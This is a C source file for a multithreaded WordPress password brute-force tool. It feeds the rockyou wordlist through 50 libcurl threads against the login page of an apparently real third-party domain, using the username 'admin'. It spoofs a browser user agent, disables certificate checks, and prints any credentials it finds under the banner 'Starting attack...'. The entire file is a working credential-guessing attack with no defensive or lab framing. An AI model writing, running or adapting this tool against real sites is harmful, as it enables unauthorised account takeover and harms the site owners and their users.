#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <pthread.h>
#include <time.h>
#include <stdbool.h>

#ifdef _WIN32
    #include <windows.h>
    #define sleep(x) Sleep(x * 1000)
    #define usleep(x) Sleep(x / 1000)
#else
    #include <unistd.h>
#endif

#define MAX_THREADS 50          // Adjust based on your system and target
#define MAX_PASSWORD_LEN 256
#define MAX_POSTFIELDS 1024
#define QUEUE_SIZE 10000        // Password queue size
#define MAX_RETRIES 2

// Global configuration
typedef struct {
    char *url;
    char *username;
    int max_connections;
    bool found_password;
    char found_creds[512];
    pthread_mutex_t found_mutex;
    pthread_mutex_t stats_mutex;
    pthread_mutex_t queue_mutex;
    pthread_cond_t queue_cond;
    
    // Password queue
    char password_queue[QUEUE_SIZE][MAX_PASSWORD_LEN];
    int queue_head;
    int queue_tail;
    int queue_count;
    bool queue_finished;
    
    // Statistics
    long total_attempts;
    long failed_attempts;
    long network_errors;
    time_t start_time;
} Config;

// Response structure for minimal memory usage
typedef struct {
    char *data;
    size_t size;
    size_t capacity;
} ResponseData;

// Optimized write callback - only store essential data
static size_t WriteCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    ResponseData *response = (ResponseData *)userp;
    size_t realsize = size * nmemb;
    
    // Only store first 2KB of response to check for success indicators
    if (response->size < 2048) {
        size_t to_copy = (response->size + realsize > 2048) ? 2048 - response->size : realsize;
        
        if (response->size + to_copy > response->capacity) {
            response->capacity = response->size + to_copy + 1;
            char *newptr = realloc(response->data, response->capacity);
            if (!newptr) return 0;
            response->data = newptr;
        }
        
        memcpy(response->data + response->size, contents, to_copy);
        response->size += to_copy;
        response->data[response->size] = '\0';
    }
    
    return realsize; // Always return full size to keep curl happy
}

// Fast success detection
bool check_success(long http_code, const char *response_data, size_t response_size) {
    // Primary indicator: 302 redirect to admin area
    if (http_code == 302) return true;
    
    // Secondary: 200 with admin content (avoid false positives)
    if (http_code == 200 && response_data && response_size > 0) {
        // Quick checks for common WordPress success indicators
        if (strstr(response_data, "wp-admin") || 
            strstr(response_data, "dashboard") ||
            strstr(response_data, "/admin/") ||
            (strstr(response_data, "logout") && !strstr(response_data, "login"))) {
            return true;
        }
    }
    
    return false;
}

// Get next password from queue
bool get_next_password(Config *config, char *password) {
    pthread_mutex_lock(&config->queue_mutex);
    
    while (config->queue_count == 0 && !config->queue_finished && !config->found_password) {
        pthread_cond_wait(&config->queue_cond, &config->queue_mutex);
    }
    
    if (config->found_password || (config->queue_count == 0 && config->queue_finished)) {
        pthread_mutex_unlock(&config->queue_mutex);
        return false;
    }
    
    strcpy(password, config->password_queue[config->queue_head]);
    config->queue_head = (config->queue_head + 1) % QUEUE_SIZE;
    config->queue_count--;
    
    pthread_mutex_unlock(&config->queue_mutex);
    return true;
}

// Worker thread function
void* worker_thread(void *arg) {
    Config *config = (Config*)arg;
    CURL *curl;
    CURLcode res;
    char password[MAX_PASSWORD_LEN];
    char postfields[MAX_POSTFIELDS];
    ResponseData response = {0};
    
    // Initialize curl for this thread
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize curl in worker thread\n");
        return NULL;
    }
    
    // Pre-allocate response buffer
    response.capacity = 2048;
    response.data = malloc(response.capacity);
    if (!response.data) {
        curl_easy_cleanup(curl);
        return NULL;
    }
    
    // Set curl options once
    curl_easy_setopt(curl, CURLOPT_URL, config->url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&response);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L); // Don't follow redirects automatically
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(curl, CURLOPT_NOSIGNAL, 1L); // Thread-safe
    curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L); // Disable Nagle's algorithm
    curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
    
    // Disable SSL verification for speed (WARNING: Only for testing!)
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    
    while (get_next_password(config, password) && !config->found_password) {
        // Reset response
        response.size = 0;
        if (response.data) response.data[0] = '\0';
        
        // Format POST data (simple concatenation for speed)
        int postfields_len = snprintf(postfields, sizeof(postfields),
                                    "log=%s&pwd=%s&wp-submit=Log+In&testcookie=1",
                                    config->username, password);
        
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, postfields_len);
        
        // Perform request with retry logic
        int retries = 0;
        bool success = false;
        
        do {
            res = curl_easy_perform(curl);
            
            if (res == CURLE_OK) {
                long http_code = 0;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
                
                // Update stats
                pthread_mutex_lock(&config->stats_mutex);
                config->total_attempts++;
                pthread_mutex_unlock(&config->stats_mutex);
                
                // Check for success
                if (check_success(http_code, response.data, response.size)) {
                    pthread_mutex_lock(&config->found_mutex);
                    if (!config->found_password) {
                        config->found_password = true;
                        snprintf(config->found_creds, sizeof(config->found_creds),
                                "Username: %s\nPassword: %s\nHTTP Code: %ld",
                                config->username, password, http_code);
                        printf("\n*** SUCCESS FOUND ***\n%s\n", config->found_creds);
                    }
                    pthread_mutex_unlock(&config->found_mutex);
                    break;
                } else {
                    pthread_mutex_lock(&config->stats_mutex);
                    config->failed_attempts++;
                    pthread_mutex_unlock(&config->stats_mutex);
                }
                success = true;
            } else {
                retries++;
                pthread_mutex_lock(&config->stats_mutex);
                config->network_errors++;
                pthread_mutex_unlock(&config->stats_mutex);
                
                if (retries <= MAX_RETRIES) {
                    usleep(1000); // 1ms delay before retry
                }
            }
        } while (!success && retries <= MAX_RETRIES && !config->found_password);
    }
    
    // Cleanup
    free(response.data);
    curl_easy_cleanup(curl);
    return NULL;
}

// Password loader thread
void* password_loader(void *arg) {
    Config *config = (Config*)arg;
    FILE *f = fopen("C:\\Users\\veerk\\Downloads\\rockyou.txt", "r");
    
    if (!f) {
        fprintf(stderr, "Failed to open wordlist file\n");
        return NULL;
    }
    
    char buffer[MAX_PASSWORD_LEN];
    
    while (fgets(buffer, sizeof(buffer), f) && !config->found_password) {
        // Clean the password
        buffer[strcspn(buffer, "\r\n")] = '\0';
        if (strlen(buffer) == 0) continue;
        
        // Wait for space in queue
        pthread_mutex_lock(&config->queue_mutex);
        while (config->queue_count >= QUEUE_SIZE && !config->found_password) {
            pthread_cond_wait(&config->queue_cond, &config->queue_mutex);
        }
        
        if (!config->found_password) {
            strcpy(config->password_queue[config->queue_tail], buffer);
            config->queue_tail = (config->queue_tail + 1) % QUEUE_SIZE;
            config->queue_count++;
            pthread_cond_broadcast(&config->queue_cond);
        }
        
        pthread_mutex_unlock(&config->queue_mutex);
    }
    
    // Signal that we're done loading passwords
    pthread_mutex_lock(&config->queue_mutex);
    config->queue_finished = true;
    pthread_cond_broadcast(&config->queue_cond);
    pthread_mutex_unlock(&config->queue_mutex);
    
    fclose(f);
    return NULL;
}

// Statistics thread
void* stats_thread(void *arg) {
    Config *config = (Config*)arg;
    long last_attempts = 0;
    
    while (!config->found_password && !config->queue_finished) {
        sleep(5); // Update every 5 seconds
        
        pthread_mutex_lock(&config->stats_mutex);
        long current_attempts = config->total_attempts;
        long failed = config->failed_attempts;
        long errors = config->network_errors;
        pthread_mutex_unlock(&config->stats_mutex);
        
        time_t elapsed = time(NULL) - config->start_time;
        double rate = elapsed > 0 ? (double)current_attempts / elapsed : 0;
        double recent_rate = (double)(current_attempts - last_attempts) / 5.0;
        
        printf("\r[Stats] Total: %ld | Failed: %ld | Errors: %ld | Rate: %.1f/sec | Recent: %.1f/sec | Time: %lds",
               current_attempts, failed, errors, rate, recent_rate, elapsed);
        fflush(stdout);
        
        last_attempts = current_attempts;
    }
    
    return NULL;
}

int main() {
    Config config = {0};
    
    // Configuration
    config.url = "https://transformatech.com/wp-login.php";
    config.username = "admin";
    config.max_connections = MAX_THREADS;
    config.start_time = time(NULL);
    
    // Initialize mutexes and condition variables
    pthread_mutex_init(&config.found_mutex, NULL);
    pthread_mutex_init(&config.stats_mutex, NULL);
    pthread_mutex_init(&config.queue_mutex, NULL);
    pthread_cond_init(&config.queue_cond, NULL);
    
    // Initialize curl globally
    curl_global_init(CURL_GLOBAL_ALL);
    
    printf("High-Performance Brute Force Tool\n");
    printf("Target: %s\n", config.url);
    printf("Username: %s\n", config.username);
    printf("Threads: %d\n", MAX_THREADS);
    printf("Starting attack...\n\n");
    fflush(stdout);
    
    // Create threads
    pthread_t *workers = malloc(MAX_THREADS * sizeof(pthread_t));
    pthread_t loader_thread, stats_thread_handle;
    
    // Start password loader
    pthread_create(&loader_thread, NULL, password_loader, &config);
    
    // Start statistics thread
    pthread_create(&stats_thread_handle, NULL, stats_thread, &config);
    
    // Start worker threads
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_create(&workers[i], NULL, worker_thread, &config);
    }
    
    // Wait for completion
    pthread_join(loader_thread, NULL);
    
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_join(workers[i], NULL);
    }
    
    pthread_join(stats_thread_handle, NULL);
    
    // Final statistics
    time_t total_time = time(NULL) - config.start_time;
    double final_rate = total_time > 0 ? (double)config.total_attempts / total_time : 0;
    
    printf("\n\nFinal Results:\n");
    printf("Total attempts: %ld\n", config.total_attempts);
    printf("Failed attempts: %ld\n", config.failed_attempts);
    printf("Network errors: %ld\n", config.network_errors);
    printf("Total time: %ld seconds\n", total_time);
    printf("Average rate: %.2f attempts/second\n", final_rate);
    
    if (config.found_password) {
        printf("\n%s\n", config.found_creds);
    } else {
        printf("\nNo valid credentials found.\n");
    }
    
    // Cleanup
    free(workers);
    pthread_mutex_destroy(&config.found_mutex);
    pthread_mutex_destroy(&config.stats_mutex);
    pthread_mutex_destroy(&config.queue_mutex);
    pthread_cond_destroy(&config.queue_cond);
    curl_global_cleanup();
    
    return 0;
}